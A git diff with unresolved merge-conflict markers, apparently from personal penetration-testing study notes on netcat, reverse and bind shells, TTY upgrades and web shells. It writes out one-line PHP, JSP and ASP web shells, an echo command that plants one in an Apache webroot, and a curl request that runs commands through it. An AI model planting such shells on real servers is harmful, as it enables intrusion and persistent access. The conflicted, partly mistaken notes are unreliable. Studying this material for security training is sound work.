@@ -429,7 +429,12 @@ Devel
 - With this listener in place, you can execute a reverse shell command that connects the remote host to our netcat listener.
 - When the netcat listener realizes you've connected, it will open a shell.
 - Needs you to setup a listening port using netcat.
+<<<<<<< HEAD
 
+=======
+# Bind Shell
+- 
+>>>>>>> b604d769b35ac7a84c4f4f903077d720b3be7d1d
 # Listening ports
 - You can set netcat to listen to a specific port. For more info see cheatsheet.
 
@@ -438,6 +443,7 @@ Devel
 - Certain shell commands are more reliable than othgers.
 - We can use the exploit we have over a remote host to execute one of these commands. (IE through python or a metasploit module) to get a reverse connection
 
+<<<<<<< HEAD
 # Reverse Shell Command
 - The executed commands depend on what OS the compromised host runs on. A website called "Payload All The Things" has a comprehensive list of reverse shell commands which can be very useful.
 - Once we do we should receive a connection through our netcat listener.
@@ -450,6 +456,61 @@ Devel
 - You have to setup a listening port BEFORE executing the bind shell command.
 - Make sure you specify the IP and port number you want the shell to connect to when executing the bind shell command.
 - The shell will be waiting on that port for input from you.
+=======
+# Bind Shell
+- A type of shell connection that is sent from the defender to the attacker.
+- Requires a listening port to be setup on your machine before it can be performed.
+
+# Upgrading TTY
+- Once we connect a bind shell to us, or conenct to a reverse shell, some terminal features may not be available. (IE viewing command history by scrolling up or editing our commands w left and right arrows.)
+- This is why we upgrade the TTY. This can be done by mapping the shell TTY to our own terminal's TTY.
+- One way to do this is to use the python/stty method. 
+- In our NC shell, type "python -c 'import pty; pty.spawn("/bin/bash")'". This will upgrade our TTY (keep in mind this is specific to bind shells)
+- After this run CTRL+Z to get back to the local terminal and type this.
+
+- 'stty raw -echo' stty is just a tool that lets you set the terminal configuration.
+- The raw setting lets you set the terminal to NOT do any text processing.
+- The -echo tells the terminal to output every character typed.
+- 'fg' this is a built-in shell command that executes within the shell's process. All this command will do is put us back into the netcat session.
+
+# Web Shells
+- Typically a web scripting (usually PHP or ASPX) that accepts commands through HTTP request parameters such as GET or POST requests.
+- This executes our command and prints the output back on our webpage.
+
+# Writing a web Shell
+- Typically a web shell is a one liner that can be memorized easily.
+- a couple of examples
+
+PHP: "<?php system($_REQUEST["cmd"]); ?>"
+JSP: "<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>"
+ASP: "<% eval request("cmd") %>"
+
+- Once we have our web shell, we need to place it into the remote host's directory (Ideally webroot)
+- This is usually done through a vulnerability in an upload feature which would allow us to write one of our shells to a file and then access the file to execute commands.
+- If we have remote command excution already through an exploit, then we can write our shell directly into the webroot to access it over the internet.
+- First you need to identify which webroot is used.
+- Some default webroots for specific types of webservers.
+Apache:	"/var/www/html/"
+Nginx: "/usr/local/nginx/html/"
+IIS: "c:\inetpub\wwwroot\"
+XAMPP:	"C:\xampp\htdocs\"
+
+we can use "echo '<script>' > <webroot_path>" to write the shell script into the webroot. The > essentially tells bash to write the script into the file of the path.
+
+EX with an apache linux host.
+"echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php"
+
+# Accessing the web shell
+- After creating the webscript we can access it through a browser by using CURL. For an apache php example we can visit the shell.php webpage
+
+"curl http://SERVER_IP:PORT/shell.php?cmd=id".
+This lets you execute the "id" command.
+
+- The great thing about web shells is it bypasses any and all firewall restrictions.
+- This is because it does not create any new port connections but just runs on web port 80 or 443.
+- Its also great that if the compromised host is rebooted, then the web shell would still be in place and can still be freely accessed without having to exploit the remote host again(once the host is booted again.).
+- Unfortunately web shells are not as interactive as reverse and bind shells since you have to re-request different URLs to execute commands. Still, in rare cases you can create a python script to automate this process and make the web shell a bit more interactive.
+>>>>>>> b604d769b35ac7a84c4f4f903077d720b3be7d1d
 
 # Upgrading TTY
 - Once we connect to a shell through NC, we can only type commands and backspace but we cant move cursors to the left right or edit the commands. We can't go up or down either to access command history.
